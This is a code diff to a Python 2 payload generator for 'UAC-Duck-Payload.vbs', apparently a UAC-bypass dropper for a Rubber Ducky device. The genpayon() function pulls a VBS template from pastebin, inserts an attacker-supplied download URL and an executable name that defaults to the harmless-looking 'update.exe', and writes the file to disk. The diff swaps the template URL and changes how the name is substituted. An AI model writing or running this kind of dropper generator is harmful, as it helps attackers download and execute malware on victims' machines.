@@ -98,18 +98,18 @@ def genpayon():
 		if not genpayon_name:
 			print 'Using deafult params' 
 			with open('UAC-Duck-Payload.vbs', 'a') as the_file:
-					txt = urllib.urlopen("http://pastebin.com/raw/tGeux7Yw").read()
+					txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
 					txt = txt.replace('[URL]', genpayon_url)
-					txt = txt.replace('/[NAME]', "/update.exe")
+					txt = txt.replace('[NAME]', "update.exe")
 					the_file.write(txt)
 			print "Payload UAC-Duck-Payload.vbs generated!"
 			time.sleep(2)
 		elif genpayon_name.endswith(".exe"):
 			
 			with open('UAC-Duck-Payload.vbs', 'a') as the_file:
-				txt = urllib.urlopen("http://pastebin.com/raw/tGeux7Yw").read()
+				txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
 				txt = txt.replace('[URL]', genpayon_url)
-				txt = txt.replace('/[NAME]', "/" + genpayon_name)
+				txt = txt.replace('[NAME]', genpayon_name)
 				the_file.write(txt)
 			
 			print "Payload UAC-Duck-Payload.vbs generated! "
